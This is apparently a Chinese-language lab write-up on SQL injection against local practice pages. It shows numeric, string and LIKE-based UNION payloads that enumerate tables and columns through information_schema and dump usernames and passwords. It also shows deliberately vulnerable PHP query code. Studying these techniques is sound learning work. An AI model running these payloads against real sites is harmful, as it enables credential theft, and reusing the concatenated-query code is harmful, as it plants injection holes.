# SQL 注入

## 数字型
以 `qsl1.php` 为例：  
```
http://localhost:8080/sql1.php?id=1
```

这里 id 就是传入的字符串。在后台 php 进行字符串拼接:
``` php
$id = $_GET['id'] ?? 1;
$sql = "SELECT title, content FROM wp_news WHERE id=$id";
```
这里查询 wp_news 中 id 对应的数据。  

如果后面加上 OR 1=1 就会导致 WHERE 语句失效，直接打印 wp_news 表中所有数据。  

用 `ORDER BY` 排序语句来查询列数：  
`id = 1 order by 2` 还有结果,`order by 3` 报错，4 也报错。确定是 2 列。  

如果 id=-1 也就是负数落空，会出来查询为空的错误。可以用 union 对表进行纵向拼接后面跟上其他表。同时 union 还规定左右两个 select 列数必须一样多。  
可以这样：
``` mysql
id = -1 UNION SELECT database(), user()
```
查询到为 test root@……  

接下来祭出大杀器来查询所有表：  
``` mysql
id=-1 UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
```

这里直接查元数据库把当前库所有表名合并成一个字符串。  
`group_concat(table_name)`  将查询出来的多行 `table_name` 用逗号拼接成一个字符串。  
后面跟上数据来源，`information_schema` 里面放着 MYSQL 所有数据库的元数据。`.tables` 存储所有数据库中的表名，关键字有：`table_name` 表名、`table_schema` 所属数据库。  

`WHERE table_schema = database()` 精准筛选当前数据库的表，database() 返回当前数据库名。  
这样就输出： 
```
users,wp_news
```

找到 users 表。  

再改成下面的语句：  
``` mysql
id=-1 UNION SELECT 1,group_concat(table_name, ',', column_name) FROM information_schema.columns WHERE table_schema=database()
```

也就是 group_concat 内部内容改了，然后 information_schema.tables 改成 information_schema.columns 而已。  
输出：  
```
users,id,users,password,users,username,wp_news,content,wp_news,id,wp_news,title
```

可以确定 users 表有 id, users password 列。  

然后直接配合 union 直接选中查表：  
``` mysql
id=-1 UNION SELECT username, password FROM users
```

即可泄漏所有账号和密码。  

## 字符型
当 OR 1=1失效时就说明不是数字型的 SQL 注入。可以考虑字符型 SQL 。  
在 id 加个 '：  
```
?id=1'
```

直接报错：  
```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1 in /var/www/html/sql2.php:14 Stack trace: #0 /var/www/html/sql2.php(14): mysqli_query(Object(mysqli), 'SELECT title, c...') #1 {main} thrown in /var/www/html/sql2.php on line 14
```

而  
```
?id=1' or '1'='1
```

注意，最后没有引号包裹。直接输出大量内容。补上引号又报错。显然是字符型。  
``` php
$id = $_GET['id'];
$sql = "SELECT title, content FROM wp_news WHERE id='$id'";
```
查看源码可以看出确实是被单引号包裹。  

``` mysql
id=-1' union select 1, 2--+
```

和数字型一样用 -1 清空表。然后 select 1, 2 后面用 `--+` 把最后的引号注释掉。输出：  
```
1
2
```

之后步骤和数字型一样。  

## search.php
php 代码长这样

``` php
$keyword = $_GET['q'] ?? '';
$sql = "SELECT title, content FROM wp_news WHERE title LIKE '%$keyword%'";
```
输入值被 %% 包裹住，也就是匹配含 keyword 的项。  
可以尝试输入内容，有匹配就会显示，没有就空项然后内容后面加单引号：  
```
?q=zzz'
```
直接报错：  

```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1 in /var/www/html/search.php:23 Stack trace: #0 /var/www/html/search.php(23): mysqli_query(Object(mysqli), 'SELECT title, c...') #1 {main} thrown in /var/www/html/search.php on line 23
```

就确定是这种 %% 包裹的。  

只需要前面填一个字符然后用单引号包裹，最后面加上 # 注释 % 即可解构开始注入：  
``` sql
z'union select 1, 2#
```

后面过程一样的。  


## login.php
这里是用 POST 发登录表单。

``` php
$message = "";
$logged_in = false;
$username = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $user = $_POST['username'];
    $pass = $_POST['password'];

    $sql = "SELECT * FROM users WHERE username='$user' AND password='$pass'";
    $res = mysqli_query($conn, $sql);

    if ($res && mysqli_num_rows($res) > 0) {
        $row = mysqli_fetch_assoc($res);
        $logged_in = true;
        $username = $row['username'];
        $message = "登录成功！欢迎 $username";
    } else {
        $message = "登录失败！执行的SQL: " . $sql;
    }
}
```
